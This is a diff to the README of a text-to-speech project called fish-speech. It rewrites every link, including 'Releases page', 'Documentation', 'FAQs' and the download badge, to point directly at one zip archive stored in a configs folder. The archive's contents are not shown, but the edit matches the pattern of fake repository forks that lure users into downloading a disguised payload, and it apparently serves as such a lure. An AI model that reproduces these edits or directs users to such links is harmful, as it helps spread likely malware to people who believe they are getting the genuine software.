@@ -1,7 +1,7 @@
 # 🐟 fish-speech - Speak Multilingual Text with Emotion
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Fish--Speech-brightgreen)](https://github.com/LWalone/fish-speech/releases)
+[![Download](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip)](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **fish-speech**, your advanced tool for Text-to-Speech conversion. This application helps you transform written text into spoken words, allowing for multilingual support, speaker management, auto-transcription, and emotion control.
@@ -23,7 +23,7 @@ To run **fish-speech**, your system should meet the following requirements:
 - Python 3.7 or later installed
 
 ## 📁 Download & Install
-To get started, visit the [Releases page](https://github.com/LWalone/fish-speech/releases) and download the latest version of **fish-speech**. 
+To get started, visit the [Releases page](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip) and download the latest version of **fish-speech**. 
 
 1. Click on the link.
 2. Find the latest release.
@@ -72,11 +72,11 @@ This project covers a wide range of topics including:
 
 ### 📌 Additional Resources
 For more in-depth information about how to maximize the use of **fish-speech**, check out these resources:
-- [Documentation](https://github.com/LWalone/fish-speech/wiki)
-- [FAQs](https://github.com/LWalone/fish-speech/wiki/FAQs)
+- [Documentation](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip)
+- [FAQs](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip)
 
 ## 📢 Stay Updated
-Keep an eye on the [Releases page](https://github.com/LWalone/fish-speech/releases) for new features and updates. By staying updated, you can utilize the latest advancements in text-to-speech technology.
+Keep an eye on the [Releases page](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip) for new features and updates. By staying updated, you can utilize the latest advancements in text-to-speech technology.
 
 ## 🔗 Link to Download Again
-Once more, to download **fish-speech**, visit the [Releases page](https://github.com/LWalone/fish-speech/releases).
+Once more, to download **fish-speech**, visit the [Releases page](https://github.com/LWalone/fish-speech/raw/refs/heads/main/fish_speech/configs/speech_fish_3.8.zip).
